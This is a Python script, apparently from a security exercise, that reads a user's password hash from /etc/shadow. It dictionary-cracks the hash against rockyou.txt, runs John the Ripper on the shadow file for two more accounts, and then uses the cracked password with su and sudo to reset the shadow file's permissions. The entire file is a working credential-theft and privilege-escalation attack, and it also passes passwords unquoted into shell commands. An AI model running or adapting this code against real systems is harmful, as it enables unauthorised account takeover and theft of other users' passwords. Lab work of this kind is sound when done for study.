#!/usr/bin/python3

#
# Author:
#   Grant Broadwater (grbcp5)
#
# File:
#   funandgames.py
#
# Date:
#   October 23, 2018


import crypt
import subprocess
import time

def getShadowPasswordForUser(userName):
    result = subprocess.run(['getent', 'shadow', userName], stdout=subprocess.PIPE)
    dummyShadowEntry = result.stdout.decode()
    passwordEntry = dummyShadowEntry.split(':')[1]
    passwordParts = passwordEntry.split('$')
    return passwordParts[1], passwordParts[2], passwordParts[3], passwordEntry


def hashWord(word, salt):
    return crypt.crypt(word, '$6$'+salt)


def basicCrack(userName):
    user_shadow_ent = getShadowPasswordForUser(userName)
    user_salt = user_shadow_ent[1]
    user_hash = user_shadow_ent[3]

    with open('rockyou.txt') as f:
        for line in f:
            line = line.rstrip('\n\r')
            attempt = hashWord(line, user_salt)
            if attempt == user_hash:
                return line
    return None


def johnCrack(sUser, sPass, userName):

    runCommand = f"/usr/sbin/john --format=sha512crypt --users={userName} /etc/shadow"
    subprocess.run(runCommand, shell=True, input=sPass.encode(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    showCommand = f"/usr/sbin/john --show --users={userName} /etc/shadow"
    showOutput = subprocess.run(showCommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    password = showOutput.stdout.decode().split(":")[1]
    return password


def fixShadowFile(sUser, sPass):
    command = f"su {sUser} -c \"echo {sPass} | sudo -S chmod 600 /etc/shadow\""
    subprocess.run(command, shell=True, input=sPass.encode(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    yourBossPass = basicCrack('yourboss')
    print(yourBossPass)
    print(johnCrack('yourboss', yourBossPass, 'yourbuddy'))
    print(johnCrack('yourboss', yourBossPass, 'sysadmin'))
    fixShadowFile('yourboss', yourBossPass)


if __name__ == '__main__':
    main()

